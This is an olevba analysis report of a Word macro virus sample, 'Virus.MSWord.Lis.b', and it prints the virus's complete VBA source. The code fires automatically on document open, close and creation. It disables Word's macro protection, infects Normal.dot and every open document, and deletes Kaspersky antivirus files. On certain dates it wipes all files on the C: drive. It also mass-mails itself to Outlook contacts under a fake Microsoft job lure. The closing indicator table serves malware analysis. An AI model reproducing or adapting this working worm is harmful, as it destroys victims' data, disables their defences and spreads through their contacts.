olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lis.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lis.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()
On Error Resume Next

 buratino
End Sub

Private Sub Document_New()
On Error Resume Next

 buratino
End Sub

Private Sub Document_Open()
On Error Resume Next
 poslat
 buratino
End Sub

Private Sub buratino()
'Lisa 2000.1'
'Âńĺ ďîćĺëŕíč˙ ńëŕňü íŕ "Slava_atrancev@mail.ru"'
'___Íĺ ďîęŕçűâŕňü âîçíčęŕţůčĺ îřčáęč___'
 On Error Resume Next
'___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 97___'
 Application.Options.VirusProtection = False
'___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 2000___'
   System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security", "level") = 1

'___Îáíîâëĺíčĺ âĺđńčč___'
  t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
  For nb = 1 To t
   If Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(nb, 1) = "'Lisa 2000'" Then
   GoTo faan
   End If
  Next nb
  GoTo foon
faan:
  For gb = 1 To t
   Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines (1)
  Next gb
foon:
    s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
    d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
    For k = 1 To Application.Documents.Count
      t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
     If t > 0 Then
     For nb = 1 To t
      If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(nb, 1) = "'Lisa 2000'" Then
       GoTo faan1
      End If
     Next nb
     GoTo foon1
faan1:
     For gb = 1 To t
      Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines (1)
     Next gb
foon1:
    End If
    Next k
'___Çŕđŕćĺíčĺ îňęđűňűő äîęóěĺíňîâ___'
    s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
    d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
    For k = 1 To Application.Documents.Count
      t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
     If t = 0 Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
  '___Óáđŕňü đĺćčě íĺâčäčěęč čç çŕđŕćĺííîăî ôŕéëŕ___'
      Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 22
     End If
    Next k
 
 '___Çŕđŕćĺíčĺ Normal.dot (Ŕâňîçŕăđóçęŕ)___'
    t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
    If t = 0 Then
      Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
 '___Đĺćčě íĺâčäčěęč____'
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Application.ShowVisualBasicEditor = True"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End If"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Next X"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Next nb"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End If"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Application.Documents.Item(X).Saved = True"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Application.Documents.Item(X).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, m"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "If Application.Documents.Item(X).VBProject.VBComponents.Item(1).CodeModule.Lines(nb, 1) =" + Chr(34) + Chr(39) + "Lisa 2000.1" + Chr(39) + Chr(34) + " Then"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "For nb = 1 To m"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "m = Application.Documents.Item(X).VBProject.VBComponents.Item(1).CodeModule.countoflines"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "For X = 1 To Docnumber"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "If Docnumber >= 1 Then"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Docnumber = Application.Documents.Count"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Next nb"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End If"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "NormalTemplate.Saved = True"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, sss"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "If Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(nb, 1) = " + Chr(34) + Chr(39) + "Lisa 2000.1" + Chr(39) + Chr(34) + " Then"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "For nb = 1 To sss"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "sss = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines"
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub viewvbcode()"
      
     End If
 '___Ďđîâĺđęŕ "Ńâîé"-"×óćîé"___'
     Set ms = Application.FileSearch
     Set gato = Application.FileSearch
     With ms
        .LookIn = "c:\windows\system\"
        .FileName = "lisa.dll"
     
     If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
    
 '___Ĺńëč ńâîé, íŕ âűőîä___'
       GoTo 100
       
 '___Ĺńëč ÷óćîé, âđĺäčňü____'
       Else
 
 '___Îáëîěŕňü AVP___'
      puti = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\kasperskylab\installedproducts\avp for ws", "folder")
      Kill (puti + "\*.avc")
      
 '___Äĺíü ŔĐĚŔĂĹÄÎÍŔ___'
     If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
     With gato
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     End If
    
    End If
    End With
    
100:

End Sub

Private Sub poslat()
'___Đŕńńűëęŕ ďî ěűëó___'
Dim pal, pol, pul, pil, pel, pyl, jsm, jsn, ms, a
Set pal = CreateObject("Outlook.Application")
Set pol = pal.GetNameSpace("MAPI")
Set ms = Application.FileSearch
With ms
        .LookIn = "c:\windows\system\"
        .FileName = "lisa.dta"
     
     If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
      Open "c:\windows\system\lisa.dta" For Input As #1
      Line Input #1, a
      Close #1
     Else
      Open "c:\windows\system\lisa.dta" For Output As #1
      Print #1, Date - 8
      Close #1
            
     End If
End With
If Date - 7 > CDate(a) Then
 If pal = "Outlook" Then
  pol.logon "profile", "password"
  For pul = 1 To pol.AddressLists.Count
   Set pil = pol.AddressLists(pul)
   Set pel = pal.CreateItem(0)
   pyl = 1
   For jsm = 1 To pil.AddressEntries.Count
    jsn = pil.AddressEntries(pyl)
    pel.Recipients.Add jsn
    pyl = pyl + 1
    If pyl > 50 Then jsm = pil.AddressEntries.Count
   Next jsm
   pel.Subject = "Quite good earnings in the Internet (read)/Íĺďëîőîé çŕđŕáîňîę â číňĺđíĺňĺ(ďđî÷ňč):" & Application.UserName
   pel.body = "The company Microsoft offers all wishing to pass competitive selection for work through the Internet as the designers of pages of technical support. The data to the electronic address of a service of technical support with a mark ' On competition ' inform.                                       Page of technical support:                                                                                                                         "
   pel.Attachments.Add ActiveDocument.FullName
   pel.send
  Next pul
 pol.Logoff
 End If
 Open "c:\windows\system\lisa.dta" For Output As #1
 Print #1, Date
 Close #1
End If
End Sub










+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lisa.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

